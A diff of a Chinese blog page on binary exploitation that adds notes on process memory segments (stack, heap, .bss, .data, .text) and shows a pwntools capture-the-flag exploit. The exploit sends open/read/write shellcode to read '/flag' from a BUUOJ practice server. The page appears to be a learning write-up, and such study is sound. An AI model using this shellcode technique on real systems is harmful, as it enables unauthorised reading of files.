@@ -362,7 +362,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">5.4k</span> In Total
+              Words <span class="post-count">5.6k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -470,7 +470,15 @@
 <p>而32 bit的地址空间就太少了</p>
 <img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231031161606472.png" alt="image-20231031161606472" style="zoom:35%;" />
 <p>程序在内存中的具体组织方式如下：</p>
+<p>程序内存由高到低：环境变量及命令行参数——&gt;栈——&gt;（内存映射段）——&gt;堆——&gt;未初始化全局或静态变量/.bss——&gt;初始化全局或静态变量/.data——&gt;程序指令和只读数据/.text</p>
+<blockquote>
+<p>内存映射段是将文件或设备映射到内存空间中，进程可以像访问内存一样访问文件或设备数据，而不需要使用显式的文件读写或设备IO接口</p>
+</blockquote>
 <img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231027202900176.png" alt="image-20231027202900176" style="zoom:33%;" />
+<blockquote>
+<p>BSS段存放未初始化的全局变量和静态局部变量，不占用exe文件空间，其内容由操作系统初始化，只记录数据所需空间的大小</p>
+<p>Data段存放已初始化的全局变量和静态局部变量，占用exe文件空间，其内容由程序初始化，需要存储所有数据和值</p>
+</blockquote>
 <h2 id="程序的装载与进程的执行">程序的装载与进程的执行</h2>
 <p>为了避免相同的链接库被不同的进程都复制一份，浪费内存空间，于是提出了动态链接（分成加载时和运行时），将链接库代码复用，存着的是链接库的地址（偏移地址）</p>
 <ul>
@@ -629,7 +637,7 @@
 </li>
 <li>
 <p>exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                                </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">                                                </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28718</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line">                                                   </span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode += shellcraft.read(3,&#x27;esp&#x27;,100)</span></span><br><span class="line"><span class="comment"># shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x0804A060</span>+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">                                                   </span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 </blockquote>
@@ -994,7 +1002,7 @@
         <p class="copyright text-muted">
           Copyright &copy;
           Leo
-          2023
+          2024
           <!-- <br>
           Theme by
           <a target="_blank" rel="noopener" href="http://beantech.org">BeanTech</a>
